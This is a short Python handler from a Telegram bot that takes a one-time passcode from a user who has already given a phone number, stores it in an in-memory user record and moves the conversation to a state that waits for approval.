# handlers/otp_handler.py
from telegram import Update
from telegram.ext import CallbackContext
from config import users
from messages.user_messages import MESSAGES
from keyboards.main_menu_keyboard import get_user_main_menu
from utils.logger import log_user_state
from handlers.conversation_states import *

async def handle_otp(update: Update, context: CallbackContext) -> int:
    """Handle OTP submission"""
    user_id = update.effective_user.id
    
    if user_id in users and users[user_id]["current_phone"]:
        otp = update.message.text
        users[user_id]["current_otp"] = otp
        users[user_id]["state"] = WAITING_OTP_APPROVAL
        await update.message.reply_text(MESSAGES["otp_received"])
        return WAITING_OTP_APPROVAL
    else:
        await update.message.reply_text(MESSAGES["no_phone"])
        return PHONE